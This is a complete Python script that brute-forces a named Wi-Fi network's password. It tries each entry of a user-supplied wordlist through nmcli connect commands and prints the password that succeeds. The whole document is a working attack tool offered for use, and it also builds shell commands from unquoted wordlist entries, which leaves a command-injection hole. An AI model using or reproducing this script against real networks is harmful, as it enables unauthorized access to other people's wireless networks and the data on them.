from os import system as command
from termcolor import colored

def brute(wordlist, wifi):
    test = open(wordlist, 'r').readlines()
    print(colored(f'[+] word list', 'green'))
    print(colored(f'[%] remove words under 7 chars', 'yellow'))
    wordlist = []
    for word in test:
        if len(word) > 6:
            wordlist.append(word)
    if len(wordlist) < len(test):
        print(colored(f"[+] removed {(len(test)-len(wordlist))} !...", 'green'))
    else:
        print(colored(f'[+] good wordlist nothing removed !...', 'green'))
        
            
    command('nmcli d wifi list > res.txt')
    check = open('res.txt', 'r')
    if not wifi in check.read():
        print(colored(f'[-] wifi not found', 'red'))
        return
    print(colored(f'[+] wifi\n\n', 'green'))
    print(colored(f'[%] starting\n\n', 'yellow'))
    check.close()
    for password in wordlist:
        command(f"nmcli d wifi connect \"{wifi}\" password {password} > res.txt")
        command("clear")
        command(f"nmcli d status > res.txt")
        check = open('res.txt', 'r')
        if wifi in check.read():
            print(colored(f'[+] wifi connected password is {password}', 'green'))
            check.close()
            return
        check.close()
        print(colored(f'[-] wrong {password}', 'red'))


try:
    wordlist = input("Enter wordlist file please (required): ")
    wifi = input("Enter wifi name please (required): ")
    brute(wordlist, wifi)
except:
    print(colored(f'[-] Error, check your wordlist file', 'red'))

    